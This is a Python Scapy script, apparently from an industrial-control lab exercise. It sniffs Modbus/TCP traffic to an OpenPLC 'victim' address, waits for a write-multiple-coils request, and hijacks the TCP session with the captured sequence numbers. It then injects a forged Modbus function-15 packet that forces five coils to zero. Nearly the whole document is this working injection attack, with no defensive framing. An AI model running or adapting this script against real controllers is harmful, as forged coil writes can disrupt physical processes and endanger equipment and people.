from scapy.all import *  

flag = 1
your_iface = "eth2"
victim_ip = "10.77.20.10"

while flag:
    OPENPLC_FRAMES = sniff(
        iface=your_iface,
        count=4,
        timeout=10,
        lfilter=lambda x: IP in x and x[IP].dst == victim_ip
    )


    for pkt in OPENPLC_FRAMES:
        if Raw in pkt:
            payload = pkt[Raw].load

        if len(payload) >= 8:
            function_code = payload[7]

            print(
                f"Transaction ID: {payload[0:2].hex()} | "
                f"Function Code: 0x{function_code:02x}"
            )
    OPENPLC_WRITE_COILS_QUERY = OPENPLC_FRAMES[2]
    OPEN_PLC_WRITE_COILS_ACK = OPENPLC_FRAMES[3]

    if Raw in OPENPLC_WRITE_COILS_QUERY:
        payload = OPENPLC_WRITE_COILS_QUERY[Raw].load

        if b"\x0f\x00\x00\x00\x05\x01" in payload:
            print("End of communication loop (write multiple coils) detected")
            flag = 0

print("crafting packet")
tcpddata = {
    'src': OPENPLC_WRITE_COILS_QUERY[IP].src,
    'dst': OPENPLC_WRITE_COILS_QUERY[IP].dst,
    'sport': OPENPLC_WRITE_COILS_QUERY[TCP].sport,
    'dport': OPENPLC_WRITE_COILS_QUERY[TCP].dport,
    'seq': OPENPLC_WRITE_COILS_QUERY[TCP].seq,
    'ack': OPENPLC_WRITE_COILS_QUERY[TCP].ack,
    'wnd': OPENPLC_WRITE_COILS_QUERY[TCP].window
}

PAYLOAD = IP(src=tcpddata['src'], dst=tcpddata['dst']) / \
             TCP(sport=tcpddata['sport'], dport=tcpddata['dport'],
                 flags="PA", window=tcpddata['wnd'], seq=tcpddata['seq'], ack=tcpddata['ack'])


Transaction_ID=13370
Unit_ID=1
Bit_Count=5
Byte_Count=1
MBFunction = 15
data = 0

class ModbusTCP(Packet):
    name = "mbtcp"
    fields_desc = [
        ShortField("Transaction_ID", Transaction_ID),
        ShortField("Protocol_ID", 0),
        ShortField("Length", 8),
        ByteField("Unit_ID", Unit_ID),

    ]

class Modbus(Packet):
    name = "modbus"
    fields_desc = [
        ByteField("MBFunction", MBFunction),
        ShortField("Reference_Number", 0),
        ShortField("Bit_Count", Bit_Count),
        ByteField("Byte_Count", Byte_Count),
        BitField("data", data, 8)
    ]

PAYLOAD = PAYLOAD/ModbusTCP()/Modbus()
print("Injecting packet...")

send(PAYLOAD, verbose=0)


print("Packet injected successfully!")
PAYLOAD.display()
